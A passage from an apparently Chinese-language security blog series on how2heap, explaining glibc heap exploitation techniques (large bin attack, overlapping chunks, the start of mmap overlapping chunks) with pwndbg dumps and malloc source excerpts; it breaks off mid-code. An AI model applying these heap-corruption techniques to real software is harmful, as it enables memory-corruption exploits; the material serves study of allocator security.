一个大小为 0x90 的 chunk，则 p1 被切分为两块，一块作为分配的 chunk 返回，剩下的一块继续留在 unsorted bin.（p1 的作用就在这里，如果没有 p1，那么切分的将是 p2）。<br>要注意的是：切割后 p1 的大小是 0x390 &lt; 0x3f0 大小属于 small bin，而 p2 的大小是 0x510 属于 large bin。<br>p2 则被整理回对应的 large bin 链表中：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-26.png#clientId=u38185df4-f4d6-4&from=paste&height=447&id=u84e1fe75&name=image.png&originHeight=893&originWidth=657&originalType=binary&size=654600&status=done&style=none&taskId=u37f8e899-1229-4164-b4f1-edd1e453ddb&width=328.5" alt="image.png"><br>过程如下：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li><li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li><li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li><li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li></ul><p>此时的内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007000</span>:      <span class="number">0x0000000000000000</span>&lt;p1<span class="number">-2</span> <span class="number">0x00000000000000a1</span>&lt;-- p1<span class="number">-1</span></span><br><span class="line"><span class="number">0x8007010</span>:      <span class="number">0x00007fffff3f3f68</span>      <span class="number">0x00007fffff3f3f68</span></span><br><span class="line"><span class="number">0x8007020</span>:      <span class="number">0x0000000008007000</span>      <span class="number">0x0000000008007000</span></span><br><span class="line"><span class="number">0x8007030</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007040</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007050</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007060</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007070</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007080</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007090</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x80070a0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000391</span>  &lt;-- p1<span class="number">-2</span> [be freed]</span><br><span class="line"><span class="number">0x80070b0</span>:      <span class="number">0x00007fffff3f3b78</span>      <span class="number">0x00007fffff3f3b78</span>  &lt;-- fd, bk</span><br><span class="line"><span class="number">0x80070c0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x80070d0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x80070e0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x80070f0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007100</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007110</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007120</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007130</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007460</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000511</span>  &lt;-- p2<span class="number">-2</span> [be freed]</span><br><span class="line"><span class="number">0x8007470</span>:      <span class="number">0x00007fffff3f3fa8</span>      <span class="number">0x00007fffff3f3fa8</span>  &lt;-- fd, bk</span><br><span class="line"><span class="number">0x8007480</span>:      <span class="number">0x0000000008007460</span>      <span class="number">0x0000000008007460</span>  &lt;-- fd_nextsize, bk_nextsize</span><br><span class="line"><span class="number">0x8007490</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>整理的过程如下所示，需要注意的是 large bins 中 chunk 按 fd 指针的顺序从大到小排列，如果大小相同则按照最近使用顺序排列：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">      [ ... ]</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">          &#123;</span><br><span class="line">              [ ... ]</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">              &#123;</span><br><span class="line">                  [ ... ]</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">              [ ... ]</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      [ ... ]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>又 free 了一个大小为 0x510 的 large bin chunk。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-27.png#clientId=u38185df4-f4d6-4&from=paste&height=93&id=uc5e947d7&name=image.png&originHeight=185&originWidth=1115&originalType=binary&size=223170&status=done&style=none&taskId=u43bf1cde-908a-435d-8a89-7fd4ddddc5e&width=557.5" alt="image.png"><br>也就是说现在 unsorted bin 有两个空闲的 chunk，末尾是大小 0x390 大小的 chunk，第一个是 size 为 0x510 的 chunk。<br>现在，我们分配一个大小小于释放的第一个大块的块。这将把释放的第二个大块移动到 largebin 列表中，使用释放的第一个大块的部分进行分配，并将释放的第一个大块的剩余部分重新插入 unsorted bin 中: [0x80070a0]<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-28.png#clientId=u38185df4-f4d6-4&from=paste&height=625&id=u13e07ab3&name=image.png&originHeight=859&originWidth=672&originalType=binary&size=561185&status=done&style=none&taskId=ucad99ee5-53d8-4874-a74e-dc69d0f7e7e&width=489" alt="image.png"><br>然后我们修改 p2（large bin chunk），修改结果如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-29.png#clientId=u38185df4-f4d6-4&from=paste&height=163&id=u59355196&name=image.png&originHeight=325&originWidth=816&originalType=binary&size=162888&status=done&style=none&taskId=u309e3074-8bf7-412f-9996-95c4dd65a3c&width=408" alt="image.png"><br>此时的内存布局变为：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007460</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x8007470</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00007ffffffed9c0</span></span><br><span class="line"><span class="number">0x8007480</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00007ffffffed9a8</span></span><br><span class="line"><span class="number">0x8007490</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-30.png#clientId=u38185df4-f4d6-4&from=paste&height=111&id=u6a033717&name=image.png&originHeight=221&originWidth=829&originalType=binary&size=34972&status=done&style=none&taskId=u06ac7c6d-fd63-4162-939a-ef7769d5588&width=414.5" alt="image.png"><br>进行 malloc(0x90) 操作，此时</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007460</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x8007470</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00000000080079a0</span></span><br><span class="line"><span class="number">0x8007480</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00000000080079a0</span></span><br><span class="line"><span class="number">0x8007490</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p3<span class="number">-2</span></span><br><span class="line"><span class="number">0x80079a0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000511</span></span><br><span class="line"><span class="number">0x80079b0</span>:      <span class="number">0x0000000008007460</span>      <span class="number">0x00007ffffffed9c0</span></span><br><span class="line"><span class="number">0x80079c0</span>:      <span class="number">0x0000000008007460</span>      <span class="number">0x00007ffffffed9a8</span></span><br><span class="line"><span class="number">0x80079d0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">2</span>gx &amp;stack_var1</span><br><span class="line"><span class="number">0x7ffffffed9d0</span>: <span class="number">0x00000000080079a0</span>      <span class="number">0x00000000080079b0</span></span><br><span class="line">pwndbg&gt; x/<span class="number">2</span>gx &amp;stack_var2</span><br><span class="line"><span class="number">0x7ffffffed9c8</span>: <span class="number">0x00000000080079a0</span>      <span class="number">0x00000000080079a0</span></span><br></pre></td></tr></table></figure><p>可以看到，栈上的两个变量也被修改成了 victim，对应的语句分别是 bck-&gt;fd = victim; 和 ictim-&gt;bk_nextsize-&gt;fd_nextsize = victim;。<br>与第一次 malloc(0x90) 过程类似：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（size = 0390），放入 small bin 中，标记该序列的 small bin 有空闲 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（size = 0x510）</li></ul><p>由于这个过程中判断条件 (unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size) 为假，程序将进入 else 分支，<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-31.png#clientId=u38185df4-f4d6-4&from=paste&height=75&id=u596894f8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=840&originalType=binary&size=41189&status=done&style=none&taskId=u714d7b80-03ec-439b-8b48-c860cd2a7df&width=420" alt="image.png"><br>其中 fwd 是 fake p2，victim 是 p3，接着 bck 被赋值为 (&amp;stack_var1 - 2)。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-32.png#clientId=u38185df4-f4d6-4&from=paste&height=66&id=u9b02184b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=855&originalType=binary&size=43024&status=done&style=none&taskId=uf9af952d-279d-4d9b-9420-9434415605d&width=427.5" alt="image.png"><br><strong>在一个序列的 large bin chunk 中 fd_nextsize 的方向是 size 变小的方向。这个循环的意思是找到一个比当前 fwd 指的 chunk 要大的地址，存入 fwd 中</strong>。<br>由于当前 fwd 的 size 被我们修改过 =0x3f0，所以没有进入循环。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-33.png#clientId=u38185df4-f4d6-4&from=paste&height=62&id=ub93e4540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=123&originWidth=849&originalType=binary&size=40594&status=done&style=none&taskId=u018824df-aecc-4366-845a-e9c3f038d74&width=424.5" alt="image.png"><br>这个原本的意思是把从 unsorted bin 中来的 chunk 插入这个序列中，但是这里没有检查合法性。这里存在这一个利用：<br>之前做的构造，把 fwd 的 bk_nextsize 指向了另一个地址。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</span><br><span class="line"><span class="comment">// then</span></span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>也就是：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">addr2-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line">*(addr2+<span class="number">4</span>) = victim;</span><br></pre></td></tr></table></figure><p>所以修改了 stack_var2 的值。<br>接着还存着另外一个利用：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>修改了 stack_var1 的值。至此利用完毕。<br><strong>总结一下利用的条件</strong>：</p><ul><li>可以修改一个 large bin chunk 的 data</li><li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li></ul><h1 id="overlapping-chunks-2-23"><a href="#overlapping-chunks-2-23" class="headerlink" title="overlapping_chunks-2.23"></a>overlapping_chunks-2.23</h1><p>运行调试，在进行过 3 次 malloc 后<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-34.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u0e8f706f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=602&originWidth=1091&originalType=binary&size=733998&status=done&style=none&taskId=u4084056e-68e3-490a-b30e-7de2fdfe0a1&width=545.5" alt="image.png"><br>查看 heap 信息<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-35.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u5f03230f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=572&originalType=binary&size=337493&status=done&style=none&taskId=u73c5c748-0a2b-4343-9486-782c2265e38&width=286" alt="image.png"><br>然后给三个 chunk 赋初值<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-36.png#clientId=u347f053a-7aac-4&from=paste&height=287&id=u4bf7a318&margin=%5Bobject%20Object%5D&name=image.png&originHeight=574&originWidth=1049&originalType=binary&size=657616&status=done&style=none&taskId=u1cf39fd7-f761-4451-813a-cf1434a6e3a&width=524.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-37.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u23dad15b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=634&originWidth=1086&originalType=binary&size=790782&status=done&style=none&taskId=u626bb9d4-b66b-42c2-b5c2-89c7ae34f95&width=543" alt="image.png"><br>然后我们 free 掉 p2,<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-38.png#clientId=u347f053a-7aac-4&from=paste&height=467&id=u4b4ea171&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1317&originalType=binary&size=1219380&status=done&style=none&taskId=ub3ae0add-f74d-4bd2-907f-bb40aa2f23e&width=658.5" alt="image.png"><br>发现它被加入到 unsortedbin 链表中<br>现在让我们模拟一个可以改写 p2.size 的溢出。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-39.png#clientId=u347f053a-7aac-4&from=paste&height=195&id=u4a17cb7e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=1183&originalType=binary&size=296512&status=done&style=none&taskId=u21b36095-9ef1-43aa-8f8c-4ff6d145fa7&width=591.5" alt="image.png"><br>对于我们这个例子来讲三个标志位影响不是很大，但是为了保持堆的稳定性，还是不要随意改动。<br>至少我们要确保 pre_in_use 为 true，不要让 p1 被误认为被 free 了。<br>我们将 p2 的 size 改写为 0x181，之后的 malloc 就会返回给我们一个 0x178（可使用大小）的堆块。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-40.png#clientId=u347f053a-7aac-4&from=paste&height=447&id=u465f6ccd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=893&originWidth=1307&originalType=binary&size=1031294&status=done&style=none&taskId=ud4c7216b-d77c-4f1d-a866-aeadd12ac7a&width=653.5" alt="image.png"><br>返回给 p4 的地址就是原来 p2 的，而且 p4 中包含了还没被 free 的 p3。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-41.png#clientId=u347f053a-7aac-4&from=paste&height=397&id=u874ea1cc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=793&originWidth=1141&originalType=binary&size=553464&status=done&style=none&taskId=ucd76f966-66ff-412b-910e-f7793e9b391&width=570.5" alt="image.png"><br>能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。<br>在 ptmalloc 中，获取 chunk 块大小的操作如下</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure><p>即使用当前块指针加上当前块大小。在 ptmalloc 中，获取前一个 chunk 信息的操作如下</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。<br>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。<br>简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。<br>​</p><h1 id="overlapping-chunks-2-2-23"><a href="#overlapping-chunks-2-2-23" class="headerlink" title="overlapping_chunks_2-2.23"></a>overlapping_chunks_2-2.23</h1><p>这是一个简单的堆块重叠问题。<br>也被称为非相邻 free chunk 合并攻击。<br>首先 malloc 五个堆块：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-42.png#clientId=u347f053a-7aac-4&from=paste&height=337&id=ub7194792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=673&originWidth=1025&originalType=binary&size=589779&status=done&style=none&taskId=u03ef26d3-2974-4be4-84f7-dbebae19735&width=512.5" alt="image.png"><br>查看此时 heap<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-43.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=u5270233b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=644&originWidth=680&originalType=binary&size=407793&status=done&style=none&taskId=ufa6339f8-57b8-46f0-bb5e-331d1df509f&width=340" alt="image.png"><br>输出</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chunk p1 from <span class="number">0x8007010</span> to <span class="number">0x80073f840</span></span><br><span class="line">chunk p2 from <span class="number">0x8007400</span> to <span class="number">0x80077e841</span></span><br><span class="line">chunk p3 from <span class="number">0x80077f0</span> to <span class="number">0x8007bd842</span></span><br><span class="line">chunk p4 from <span class="number">0x8007be0</span> to <span class="number">0x8007fc843</span></span><br><span class="line">chunk p5 from <span class="number">0x8007fd0</span> to <span class="number">0x80083b8</span></span><br></pre></td></tr></table></figure><p>然后填充赋值<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-44.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u105dc4ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=633&originWidth=982&originalType=binary&size=623807&status=done&style=none&taskId=u03d819ac-4cd2-486e-9a66-f124ca178ae&width=491" alt="image.png"><br>查看<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-45.png#clientId=u347f053a-7aac-4&from=paste&height=211&id=ue6c8de7d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1079&originalType=binary&size=445916&status=done&style=none&taskId=uce6ac4ca-4934-49e8-b21e-de027200e44&width=539.5" alt="image.png"><br>此时释放 p4，因为 p5 的存在所以 p4 不会被合并。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-46.png#clientId=u347f053a-7aac-4&from=paste&height=355&id=u797679fd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=710&originWidth=864&originalType=binary&size=604887&status=done&style=none&taskId=u2e8d5858-ac53-43e5-8f9a-78adba03a9b&width=432" alt="image.png"><br>然后我们在 p1 触发一个溢出，将 p2 的 size 改写成 p2 和 p3 大小的和。之后更新 presize 的时候是通过 p2 的地址加上 p2 的 size 来寻找的要修改的位置的，这里刚好就把 p4 头部的 presize 给改掉了。<br>之后 free(p2)的时候，分配器就会认为 p4 是下一个块。然后就会错误地将 p3 和 p2 合并。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-47.png#clientId=u347f053a-7aac-4&from=paste&height=477&id=u0779c540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=954&originWidth=1095&originalType=binary&size=1034227&status=done&style=none&taskId=u5fc07d71-872d-4906-b822-27999e48bb6&width=547.5" alt="image.png"><br>这时候 malloc 一个大小 2000 的堆 p6&lt;0xbd1，返回给 p6 的地址就是 p2 的地址了，p6 内部也包含了未被 free 的 p3，又造成了 overlapping，修改 p6 内容即可修改 p3 内容。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-48.png#clientId=u347f053a-7aac-4&from=paste&height=461&id=ud4e0d6d0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=922&originWidth=1062&originalType=binary&size=593880&status=done&style=none&taskId=u9824bb34-39a1-41f9-8491-007382d7ca3&width=531" alt="image.png"><br>我们就可以用 p6 改写 p3 中的任何数据。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-49.png#clientId=u347f053a-7aac-4&from=paste&height=45&id=u8a504495&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=385&originalType=binary&size=23281&status=done&style=none&taskId=ufc137763-aa72-417e-b0e3-19618068a5e&width=210.5" alt="image.png"><br>查看 p3 数据<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-50.png#clientId=u347f053a-7aac-4&from=paste&height=103&id=uff58dfc3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=206&originWidth=1821&originalType=binary&size=351670&status=done&style=none&taskId=u79b992fb-5ce9-4fef-a0c3-fa77c8646f3&width=910.5" alt="image.png"><br>修改之后<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-51.png#clientId=u347f053a-7aac-4&from=paste&height=373&id=ue02a99dc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=745&originWidth=1803&originalType=binary&size=1230606&status=done&style=none&taskId=u61a5de77-4b93-4de2-a164-2ca52e95455&width=901.5" alt="image.png"><br>与之前的 overlapping 相比，之前的是释放后修改 size，重新申请后覆盖了后面的堆；这个是先修改 size,使之大小覆盖了后面的堆，再释放后和已释放的大后个堆合并，包含了要覆盖的堆，重新申请后即可覆盖包含的堆的内容。</p><h1 id="mmap-overlapping-chunks-2-28"><a href="#mmap-overlapping-chunks-2-28" class="headerlink" title="mmap_overlapping_chunks-2.28"></a>mmap_overlapping_chunks-2.28</h1><p>代码翻译如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;这种技术依然是 overlapping 但是针对的是比较大的 (通过 mmap 申请的)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;分配大的 chunk 是比较特殊的，因为他们分配在单独的内存中，而不是普通的堆中\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;分配三个大小为 0x100000 的 chunk \n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第一个 mmap 块位于 Libc 上方： %p\n&quot;</span>,top_ptr);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第二个 mmap 块位于 Libc 下方： %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第三个 mmap 块低于第二个 mmap 块: %p\n&quot;</span>, mmap_chunk_3);</span><br><span 